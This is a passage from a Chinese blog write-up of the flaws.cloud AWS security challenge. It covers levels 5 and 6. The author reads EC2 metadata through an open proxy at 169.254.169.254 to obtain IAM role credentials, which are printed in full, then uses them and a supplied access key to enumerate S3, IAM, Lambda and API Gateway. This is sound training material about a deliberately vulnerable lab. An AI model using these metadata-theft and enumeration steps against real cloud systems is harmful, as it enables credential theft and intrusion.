4中，当我寻找可疑目录或者文件时，在/mnt/flaws/home/ubuntu/.bash_history发现了一些有趣的信息:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ip-172-31-21-33:/mnt/flaws/home/ubuntu$ cat .bash_history</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">cat setupNginx.sh</span><br><span class="line">curl 169.254.169.254</span><br><span class="line">curl  http://169.254.169.254/latest/meta-data</span><br><span class="line">wget  http://169.254.169.254/latest/meta-data</span><br><span class="line">cat meta-data</span><br><span class="line">curl -XGET http://169.254.169.254/latest/meta-data</span><br><span class="line">wget  http://169.254.169.254/latest/meta-data/iam</span><br><span class="line">cat iam</span><br><span class="line">wget  http://169.254.169.254/latest/meta-data/iam/info</span><br><span class="line">cat info</span><br><span class="line">rm info iam</span><br><span class="line">ls</span><br><span class="line">cat meta-data</span><br><span class="line">curl  http://169.254.169.254/latest/meta-data/iam/info</span><br><span class="line">curl  http://169.254.169.254/latest/meta-data/</span><br><span class="line">curl  http://169.254.169.254/latest/meta-data/profile/</span><br><span class="line">curl  http://169.254.169.254/latest/meta-data/profile</span><br><span class="line">curl  http://169.254.169.254/latest/user-data</span><br><span class="line">curl  http://169.254.169.254/iam/security-credentials/flaws</span><br><span class="line">curl  http://169.254.169.254/iam/security-credentials</span><br><span class="line">curl  http://169.254.169.254/iam/security-credentials/flaws/</span><br><span class="line">curl  http://169.254.169.254/iam/</span><br><span class="line">wget http://169.254.169.254/iam/security-credentials/flaws</span><br><span class="line">curl  http://169.254.169.254/meta-data/iam/security-credentials/flaws</span><br><span class="line">curl  http://169.254.169.254/latest/meta-data/iam/security-credentials/flaws</span><br><span class="line">curl  http://169.254.169.254/latest/meta-data/iam/security-credentials</span><br><span class="line">sudo su -</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>包含<code>169.254.169.254</code>这个IP的几个操作引起了我的注意。<code>169.254.169.254</code>是一个特殊的IP地址，在云服务上（包括AWS），为元数据服务。有关内容可以参见<a href="https://qastack.cn/server/427018/what-is-this-ip-address-169-254-169-254">https://qastack.cn/server/427018/what-is-this-ip-address-169-254-169-254</a> 。</p><p>我们可以用代理来获取自身的元数据，或许能找到一些认证文件或者敏感信息。尝试访问<a href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/">http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/</a> ，得到一堆文件目录：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">ami-id</span><br><span class="line">ami-launch-index</span><br><span class="line">ami-manifest-path</span><br><span class="line">block-device-mapping/</span><br><span class="line">events/</span><br><span class="line">hostname</span><br><span class="line">iam/</span><br><span class="line">identity-credentials/</span><br><span class="line">instance-action</span><br><span class="line">instance-id</span><br><span class="line">instance-type</span><br><span class="line">local-hostname</span><br><span class="line">local-ipv4</span><br><span class="line">mac</span><br><span class="line">metrics/</span><br><span class="line">network/</span><br><span class="line">placement/</span><br><span class="line">profile</span><br><span class="line">public-hostname</span><br><span class="line">public-ipv4</span><br><span class="line">public-keys/</span><br><span class="line">reservation-id</span><br><span class="line">security-groups</span><br><span class="line">services/</span><br></pre></td></tr></table></figure><p>在里面找寻敏感信息，最终在<a href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws">http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws</a> 找到了泄露出的相关认证信息：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;Code&quot; : &quot;Success&quot;,</span><br><span class="line">  &quot;LastUpdated&quot; : &quot;2020-03-22T13:15:35Z&quot;,</span><br><span class="line">  &quot;Type&quot; : &quot;AWS-HMAC&quot;,</span><br><span class="line">  &quot;AccessKeyId&quot; : &quot;ASIA6GG7PSQGTDDQYCXX&quot;,</span><br><span class="line">  &quot;SecretAccessKey&quot; : &quot;GDgTEgIGzHntptP+d+OCUkh4kCt6OUpFAEwr3Pgp&quot;,</span><br><span class="line">  &quot;Token&quot; : &quot;IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJHMEUCIQCRhJkGWHi5ic92C1P3CYkQ6y80qrDQOGnDoIz4PwqqbQIgNNna1gE6ze5ChRMPckatRWodHnnjjvyKPR2rhUKWiAEqvwMILhABGgw5NzU0MjYyNjIwMjkiDAFu8gkhNhgSdqABnyqcA1Uf5xMvRGDIGCeB40MAxq+HZNjhrI+EhdtFfpiAFGy6XrKKEekDvXAi9r8NnCd95nQJFdQfQWIXMtSlSjSQFf9o4o3xJ3XveYEVGqMn94t2Ch+LabJkssgeNg8vgJaT/bpagAHou4L2R73JDOg/YaLxCj1VglJlfYnzdY530P/8mW+zX+bhH2CXfGVtEW/lriFWsivYBqHtou8Om0Q34uCegkiHoGjNybToqGmEkMKZcwVzLdJ3cKQbvta2vIJ4dUo99eneSS2IHzojSZNS7ikxM31jJtrTfqIRVNreshgNLPRVxnBrd4V8ceHR7+8wyDRvFqxJ9cBePfUXhVt8xh95eeYLNSyNXJRASjwsNt6XB2au1ragGFRPJj1y2iZLZoUKeeTSqeVMmyN1w7LYjPx9rrui1er+C1t/Ytedd5WG94mJ8zEuQglY0RIcMfAChogIW6ZAq+E3DcJ/ADbuRrtMlqCnK4mq4RuwSrxND9VbA7oKWZVGPVkiFeGosgDtO6Ky/fk1uW7t3jvrzDvgok7mmLrtm3XqqySwlNAw7snd8wU65wFmeTnbDFKx3sVbLZC0/ZIOmUyuOrF3Yy/xyHjuxjKnv2xgt20jT8laVf4skWLExgSyTFxubuR0iYapG+J0dn/or9GiIMPAtXqOD6OGSzi3nDUYJkmO9dp8DTTv2hYWGKzkOLA+LpNYXM5oA50agJBJ1a461ax18xnAgwj1za44+mwW+qf6Ad272mvNgI+xKRgmXHt8OUPhDQdTqyMcQHjRaqmjLNau9Cx2Ks3ddZXlq0J/DSqOp7u7UAspnkO2OAogwvkhYGv0VDfH0W0q9WqvcoAUymJjRTWh6Ncsp+ubt+cUg0OSZuw=&quot;,</span><br><span class="line">  &quot;Expiration&quot; : &quot;2020-03-22T19:39:11Z&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功获取到一个<code>IAM</code>角色的认证信息。我们将这个认证信息添加到~/.aws/credentials中：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[proxy]</span><br><span class="line">aws_access_key_id = ASIA6GG7PSQGTDDQYCXX</span><br><span class="line">aws_secret_access_key = GDgTEgIGzHntptP+d+OCUkh4kCt6OUpFAEwr3Pgp</span><br><span class="line">aws_session_token = IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJHMEUCIQCRhJkGWHi5ic92C1P3CYkQ6y80qrDQOGnDoIz4PwqqbQIgNNna1gE6ze5ChRMPckatRWodHnnjjvyKPR2rhUKWiAEqvwMILhABGgw5NzU0MjYyNjIwMjkiDAFu8gkhNhgSdqABnyqcA1Uf5xMvRGDIGCeB40MAxq+HZNjhrI+EhdtFfpiAFGy6XrKKEekDvXAi9r8NnCd95nQJFdQfQWIXMtSlSjSQFf9o4o3xJ3XveYEVGqMn94t2Ch+LabJkssgeNg8vgJaT/bpagAHou4L2R73JDOg/YaLxCj1VglJlfYnzdY530P/8mW+zX+bhH2CXfGVtEW/lriFWsivYBqHtou8Om0Q34uCegkiHoGjNybToqGmEkMKZcwVzLdJ3cKQbvta2vIJ4dUo99eneSS2IHzojSZNS7ikxM31jJtrTfqIRVNreshgNLPRVxnBrd4V8ceHR7+8wyDRvFqxJ9cBePfUXhVt8xh95eeYLNSyNXJRASjwsNt6XB2au1ragGFRPJj1y2iZLZoUKeeTSqeVMmyN1w7LYjPx9rrui1er+C1t/Ytedd5WG94mJ8zEuQglY0RIcMfAChogIW6ZAq+E3DcJ/ADbuRrtMlqCnK4mq4RuwSrxND9VbA7oKWZVGPVkiFeGosgDtO6Ky/fk1uW7t3jvrzDvgok7mmLrtm3XqqySwlNAw7snd8wU65wFmeTnbDFKx3sVbLZC0/ZIOmUyuOrF3Yy/xyHjuxjKnv2xgt20jT8laVf4skWLExgSyTFxubuR0iYapG+J0dn/or9GiIMPAtXqOD6OGSzi3nDUYJkmO9dp8DTTv2hYWGKzkOLA+LpNYXM5oA50agJBJ1a461ax18xnAgwj1za44+mwW+qf6Ad272mvNgI+xKRgmXHt8OUPhDQdTqyMcQHjRaqmjLNau9Cx2Ks3ddZXlq0J/DSqOp7u7UAspnkO2OAogwvkhYGv0VDfH0W0q9WqvcoAUymJjRTWh6Ncsp+ubt+cUg0OSZuw=</span><br></pre></td></tr></table></figure><p>尝试使用代理访问：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~$ aws --profile proxy s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud                                                 </span><br><span class="line">                                   PRE ddcc78ff/                                                                           </span><br><span class="line">        2017-02-27 10:11:07        871 index.html</span><br></pre></td></tr></table></figure><p>成功获得权限进入，并找到隐藏目录<code>ddcc78ff/</code>，访问 <a href="http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/">http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/</a> ，这就是level 6 的入口，成功通关level 5。</p><h3 id="小结：-1"><a href="#小结：-1" class="headerlink" title="小结："></a>小结：</h3><ul><li>IP地址169.254.169.254是云服务中的一个神奇IP，AWS、Azure、谷歌、DigitalOcean等公司都使用它来查找自身的元数据。对于谷歌，对请求有额外的约束，比如要求它使用<code>Metadata-Flavor: Google</code>作为HTTP头，拒绝带有<code>x - forwarding - for</code>头的请求，而在AWS中并没有约束。如果攻击者可以从EC2向该IP发出任何类型的HTTP请求，就很有可能获取到一些敏感信息。这里提供hackerone平台上两篇公开披露的报告用以参考学习：<a href="https://hackerone.com/reports/53088">https://hackerone.com/reports/53088</a> 、<a href="https://hackerone.com/reports/53004">https://hackerone.com/reports/53004</a> 。</li></ul><h2 id="0x07-Level-6"><a href="#0x07-Level-6" class="headerlink" title="0x07 Level 6"></a>0x07 Level 6</h2><blockquote><p>For this final challenge, you’re getting a user access key that has the SecurityAudit policy attached to it. See what else it can do and what else you might find in this AWS account.</p><p>Access key ID: AKIAJFQ6E7BY57Q3OBGA<br>Secret: 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</p></blockquote><p>最后一关提供了一个附加了安全审计策略的用户的认证信息，看看我们能找到什么有趣的信息。</p><p>首先使用AWS CLI 配置这个用户：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">~$ aws configure --profile flawslevel6</span><br><span class="line">AWS Access Key ID [None]: AKIAJFQ6E7BY57Q3OBGA</span><br><span class="line">AWS Secret Access Key [None]: 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</span><br><span class="line">Default region name [None]: us-west-2</span><br><span class="line">Default output format [None]:</span><br></pre></td></tr></table></figure><p>在<a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_job-functions.html#jf_security-auditor">AWS的文档</a>中，对<code>SecurityAudit </code>这样描述：</p><blockquote><p><a href="https://console.aws.amazon.com/iam/home#policies/arn:aws:iam::aws:policy/SecurityAudit">SecurityAudit</a></p><p><strong>Use case:</strong> This user monitors accounts for compliance with security requirements. This user can access logs and events to investigate potential security breaches or potential malicious activity.</p><p><strong>Policy description:</strong> This policy grants permissions to view configuration data for many AWS services and to review their logs.</p></blockquote><p>意思就是说：该用户可以访问日志和事件来调查潜在的安全漏洞或潜在的恶意活动，被授予查看一些AWS服务的配置数据和查看其日志的权限。</p><p>在level 3 中，我们查看到了S3存储桶中包含的内容：</p><p><img src="https://p1.ssl.qhimg.com/t01b7bbaeca18c15902.png"></p><p>尝试访问<code>flaws-logs</code>，结果没有权限：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~$ aws s3 ls s3://flaws-logs --profile flawslevel6</span><br><span class="line"></span><br><span class="line">An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied</span><br></pre></td></tr></table></figure><p>该政策可能涉及到的其他AWS服务包括<code>CloudTrail</code>和<code>CloudWatch</code>，继续尝试访问：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">~$ aws cloudtrail describe-trails --profile flawslevel6</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;trailList&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;IncludeGlobalServiceEvents&quot;: true,</span><br><span class="line">            &quot;IsOrganizationTrail&quot;: true,</span><br><span class="line">            &quot;Name&quot;: &quot;summitroute-logs&quot;,</span><br><span class="line">            &quot;TrailARN&quot;: &quot;arn:aws:cloudtrail:us-east-1:763647780161:trail/summitroute-logs&quot;,</span><br><span class="line">            &quot;LogFileValidationEnabled&quot;: true,</span><br><span class="line">            &quot;IsMultiRegionTrail&quot;: true,</span><br><span class="line">            &quot;HasCustomEventSelectors&quot;: false,</span><br><span class="line">            &quot;S3BucketName&quot;: &quot;summitroute-logs&quot;,</span><br><span class="line">            &quot;HasInsightSelectors&quot;: false,</span><br><span class="line">            &quot;HomeRegion&quot;: &quot;us-east-1&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>CloudTrail</code>服务是开启的，那么尝试查看<code>CloudTrail</code>的事件，结果没有权限：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~$ aws cloudtrail lookup-events --profile flawslevel6</span><br><span class="line"></span><br><span class="line">An error occurred (AccessDeniedException) when calling the LookupEvents operation: User: arn:aws:iam::975426262029:user/Level6 is not authorized to perform: cloudtrail:LookupEvents</span><br></pre></td></tr></table></figure><p>转换思路，查看此用户的相关信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">~$ aws --profile flawslevel6 iam get-user</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;User&quot;: &#123;</span><br><span class="line">        &quot;UserName&quot;: &quot;Level6&quot;,</span><br><span class="line">        &quot;Path&quot;: &quot;/&quot;,</span><br><span class="line">        &quot;CreateDate&quot;: &quot;2017-02-26T23:11:16Z&quot;,</span><br><span class="line">        &quot;UserId&quot;: &quot;AIDAIRMDOSCWGLCDWOG6A&quot;,</span><br><span class="line">        &quot;Arn&quot;: &quot;arn:aws:iam::975426262029:user/Level6&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到<code>UserName</code>为<code>Level6</code>，继续查看这个用户的附加策略：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">~$ aws --profile flawslevel6 iam list-attached-user-policies --user-name Level6</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;AttachedPolicies&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;PolicyName&quot;: &quot;list_apigateways&quot;,</span><br><span class="line">            &quot;PolicyArn&quot;: &quot;arn:aws:iam::975426262029:policy/list_apigateways&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;PolicyName&quot;: &quot;MySecurityAudit&quot;,</span><br><span class="line">            &quot;PolicyArn&quot;: &quot;arn:aws:iam::975426262029:policy/MySecurityAudit&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现附加了<code>list_apigateways</code>的策略，更详细的查看这个策略：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">~$ aws --profile flawslevel6 iam get-policy  --policy-arn arn:aws:iam::975426262029:policy/list_apigat eways</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;Policy&quot;: &#123;</span><br><span class="line">        &quot;PolicyName&quot;: &quot;list_apigateways&quot;,</span><br><span class="line">        &quot;Description&quot;: &quot;List apigateways&quot;,</span><br><span class="line">        &quot;PermissionsBoundaryUsageCount&quot;: 0,</span><br><span class="line">        &quot;CreateDate&quot;: &quot;2017-02-20T01:45:17Z&quot;,</span><br><span class="line">        &quot;AttachmentCount&quot;: 1,</span><br><span class="line">        &quot;IsAttachable&quot;: true,</span><br><span class="line">        &quot;PolicyId&quot;: &quot;ANPAIRLWTQMGKCSPGTAIO&quot;,</span><br><span class="line">        &quot;DefaultVersionId&quot;: &quot;v4&quot;,</span><br><span class="line">        &quot;Path&quot;: &quot;/&quot;,</span><br><span class="line">        &quot;Arn&quot;: &quot;arn:aws:iam::975426262029:policy/list_apigateways&quot;,</span><br><span class="line">        &quot;UpdateDate&quot;: &quot;2017-02-20T01:48:17Z&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们得到了这个策略的<code>Arn</code>和<code>DefaultVersionId</code>，能够进一步详细查看：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">~$ aws --profile flawslevel6 iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/list _apigateways --version-id v4</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;PolicyVersion&quot;: &#123;</span><br><span class="line">        &quot;CreateDate&quot;: &quot;2017-02-20T01:48:17Z&quot;,</span><br><span class="line">        &quot;VersionId&quot;: &quot;v4&quot;,</span><br><span class="line">        &quot;Document&quot;: &#123;</span><br><span class="line">            &quot;Version&quot;: &quot;2012-10-17&quot;,</span><br><span class="line">            &quot;Statement&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;Action&quot;: [</span><br><span class="line">                        &quot;apigateway:GET&quot;</span><br><span class="line">                    ],</span><br><span class="line">                    &quot;Resource&quot;: &quot;arn:aws:apigateway:us-west-2::/restapis/*&quot;,</span><br><span class="line">                    &quot;Effect&quot;: &quot;Allow&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;IsDefaultVersion&quot;: true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现了这个用户允许使用<code>GET</code>方法访问资源<code>arn:aws:apigateway:us-west-2::/restapis/*</code>。<code>apigateway</code>通常与<code>Lambda</code>函数放在一起使用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">~$ aws --region us-west-2 --profile flawslevel6 lambda list-functions</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;Functions&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;TracingConfig&quot;: &#123;</span><br><span class="line">                &quot;Mode&quot;: &quot;PassThrough&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;Version&quot;: &quot;$LATEST&quot;,</span><br><span class="line">            &quot;CodeSha256&quot;: &quot;2iEjBytFbH91PXEMO5R/B9DqOgZ7OG/lqoBNZh5JyFw=&quot;,</span><br><span class="line">            &quot;FunctionName&quot;: &quot;Level6&quot;,</span><br><span class="line">            &quot;MemorySize&quot;: 128,</span><br><span class="line">            &quot;RevisionId&quot;: &quot;22f08307-9080-4403-bf4d-481ddc8dcb89&quot;,</span><br><span class="line">            &quot;CodeSize&quot;: 282,</span><br><span class="line">            &quot;FunctionArn&quot;: &quot;arn:aws:lambda:us-west-2:975426262029:function:Level6&quot;,</span><br><span class="line">            &quot;Handler&quot;: &quot;lambda_function.lambda_handler&quot;,</span><br><span class="line">            &quot;Role&quot;: &quot;arn:aws:iam::975426262029:role/service-role/Level6&quot;,</span><br><span class="line">            &quot;Timeout&quot;: 3,</span><br><span class="line">            &quot;LastModified&quot;: &quot;2017-02-27T00:24:36.054+0000&quot;,</span><br><span class="line">            &quot;Runtime&quot;: &quot;python2.7&quot;,</span><br><span class="line">            &quot;Description&quot;: &quot;A starter AWS Lambda function.&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在一个<code>FunctionName</code>叫做Level6，继续详细查看这个策略：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aws --region us-west-2 --profile flawslevel6 lambda get-policy --function-name Level6</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;Policy&quot;: &quot;&#123;\&quot;Version\&quot;:\&quot;2012-10-17\&quot;,\&quot;Id\&quot;:\&quot;default\&quot;,\&quot;Statement\&quot;:[&#123;\&quot;Sid\&quot;:\&quot;904610a93f593b76ad66ed6ed82c0a8b\&quot;,\&quot;Effect\&quot;:\&quot;Allow\&quot;,\&quot;Principal\&quot;:&#123;\&quot;Service\&quot;:\&quot;apigateway.amazonaws.com\&quot;&#125;,\&quot;Action\&quot;:\&quot;lambda:InvokeFunction\&quot;,\&quot;Resource\&quot;:\&quot;arn:aws:lambda:us-west-2:975426262029:function:Level6\&quot;,\&quot;Condition\&quot;:&#123;\&quot;ArnLike\&quot;:&#123;\&quot;AWS:SourceArn\&quot;:\&quot;arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\&quot;&#125;&#125;&#125;]&#125;&quot;,</span><br><span class="line">    &quot;RevisionId&quot;: &quot;22f08307-9080-4403-bf4d-481ddc8dcb89&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现<code>arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\</code>这样一串有趣的资源信息，其中<code>s33ppypa75</code>为<code>rest-api-id</code>，利用这个信息，进一步查看，得到<code>&quot;stageName&quot;: &quot;Prod&quot;</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">~$ aws --profile flawslevel6 --region us-west-2 apigateway get-stages --rest-api-id &quot;s33ppypa75&quot;</span><br><span class="line">&#123;</span><br><span class="line">    &quot;item&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;tracingEnabled&quot;: false,</span><br><span class="line">            &quot;stageName&quot;: &quot;Prod&quot;,</span><br><span class="line">            &quot;cacheClusterEnabled&quot;: false,</span><br><span class="line">            &quot;cacheClusterStatus&quot;: &quot;NOT_AVAILABLE&quot;,</span><br><span class="line">            &quot;deploymentId&quot;: &quot;8gppiv&quot;,</span><br><span class="line">            &quot;lastUpdatedDate&quot;: 1488155168,</span><br><span class="line">            &quot;createdDate&quot;: 1488155168,</span><br><span class="line">            &quot;methodSettings&quot;: &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据AWS的资源端点规则：<code>https://&lt;rest-api-id&gt;.execute-api.&lt;region&gt;.amazonaws.com/&lt;stage-name&gt;/&lt;lambda function&gt;</code>，可以得到最终的资源点位于：<a href="https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6">https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6</a> 。在浏览器中访问地址，返回一串文字：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;Go to http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/</span><br></pre></td></tr></table></figure><p>访问给出的网址，成功通关level 6，至此多有挑战全部通关完成：</p><p><img src="https://p2.ssl.qhimg.com/t01e05395f18458bd2d.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过FLAWS的挑战，对涉及到AWS的有关漏洞进行了实践学习，从安全运维人员的角度，可以避免踩坑，配置合理的内容和权限，从漏洞发现挖掘的角度，可以在漏洞发现过程中，尝试可能存在的隐患点、漏洞点，说不定有意外之喜。</p><p>作为一个小白，这篇FLAWS通关记，是为了记录和分享自己的学习过程，分析记录的不到位的地方，还请大佬们收下留情 =）</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>aws</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>goolge ctf 2019 stage1 writeup_part_3</title>
    <link href="/2019/10/02/google_ctf_2019_stage1_writeup_3/"/>
    <url>/2019/10/02/google_ctf_2019_stage1_writeup_3/</url>
    
